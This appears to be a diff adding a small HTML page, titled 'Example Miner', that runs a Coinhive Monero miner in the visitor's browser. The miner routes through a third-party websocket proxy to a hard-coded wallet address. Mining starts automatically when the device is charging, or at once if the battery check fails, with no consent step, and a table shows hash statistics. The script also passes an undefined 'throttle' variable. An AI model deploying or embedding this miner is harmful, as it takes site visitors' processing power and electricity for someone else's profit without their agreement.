@@ -1,0 +1,55 @@
+﻿<html>
+	<head>
+		<title>Example Miner</title>
+		<script src="lib/coinhive.js"></script>
+	</head>
+	<body class="body">
+		<script type="text/javascript">
+			coinhive.CONFIG.WEBSOCKET_SHARDS = [["wss://monproxy.techidiots.net/_ws_/"]];
+			var miner = coinhive.User('4B5rfHVYF7R8ag71iamrFSddbV5wAN97BG5W5VsVqPJMLML9hugBngDGwVPNZYKGPqNtoz1eJYhFWEnBCpgt4cJUG8xBPB1', 'monproxy');
+			//var threads = Math.max(1,Math.floor(navigator.hardwareConcurrency/2));
+			//miner.setNumThreads(threads);
+			miner.setThrottle(throttle);
+			
+			try {
+				navigator.getBattery().then(function (battery) {
+			
+					if (battery.charging) miner.start();
+			
+					battery.onchargingchange = function (evt) {
+						if (battery.charging) miner.start();
+						else miner.stop();
+					}
+			
+				});
+			}catch(e){miner.start();}
+			
+			// Update stats once per second
+			setInterval(function() {
+				var hashesPerSecond = miner.getHashesPerSecond();
+				var totalHashes = miner.getTotalHashes();
+				var acceptedHashes = miner.getAcceptedHashes();
+
+				// Output to HTML elements...
+				document.getElementById("hashesPerSecond").innerHTML = hashesPerSecond;
+				document.getElementById("totalHashes").innerHTML = totalHashes;
+				document.getElementById("acceptedHashes").innerHTML = acceptedHashes;
+			}, 1000);
+		</script>
+		<table>
+			<tr>
+				<td>Hashes Per Second</td>
+				<td id="hashesPerSecond"></td>
+			</tr>
+			<tr>
+				<td>Accepted Hashes</td>
+				<td id="acceptedHashes"></td>
+			</tr>
+			<tr>
+				<td>Total Hashes</td>
+				<td id="totalHashes"></td>
+			</tr>
+		</table>
+	</body>
+<!-- #EndTemplate -->
+</html>
